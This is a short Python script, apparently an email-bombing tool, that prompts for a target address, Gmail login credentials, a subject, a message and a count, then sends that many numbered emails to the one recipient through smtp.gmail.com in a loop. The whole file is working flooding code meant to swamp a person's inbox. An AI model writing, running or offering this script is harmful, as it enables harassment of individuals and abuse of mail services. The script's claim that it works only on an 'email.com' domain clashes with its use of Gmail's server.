def boom():
    try:
        i=1
        import smtplib
        from email.message import EmailMessage
        print("This software only work on email.com domain")
        #asking for reciver's emails
        print("provide the reciver's email")
        reciver=input("reciver-")
        #asking for sender email
        print("Input the Sender email id")
        sender=input("email--> ")
        print("provide the key")
        key=input("key- ")
        print("provide the subject")
        sub=input("subject- ")
       
        print("How much email's do you want to send?")
        number_of_mails=int(input("count-- "))
        #for key read the readme file
        print("Input the message")
        msg=input("Message-- ")
        # making loop for sendeing for define number's of emails to reciver
        while (number_of_mails>=i):
                # subject of the email
                subject = EmailMessage()
                subject["Subject"] = f"{sub}-->{i}"
                obj = smtplib.SMTP("smtp.gmail.com", 587)
                obj.starttls()
                obj.login(sender, key)
                obj.sendmail(sender,reciver ,f"{subject}{msg}")
                print(f"{i}/..message has been send to {reciver} ")
                print(f"left email {number_of_mails-i} kindly don't quit  until the process end's")
                obj.quit()
                i += 1
    except Exception  as error:
        print("Something is wrong happend please check network connection or reinsall the tool ")
        print(error)
boom()
